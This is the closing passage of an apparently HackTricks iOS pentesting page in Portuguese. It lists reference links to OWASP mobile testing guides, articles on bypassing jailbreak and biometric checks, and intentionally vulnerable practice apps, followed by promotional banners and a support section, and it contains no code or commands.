* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Curso gratuito de iOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< vers√£o Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< vers√£o Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** da **comunidade mais avan√ßada** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}
{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
</details>
{% endhint %}
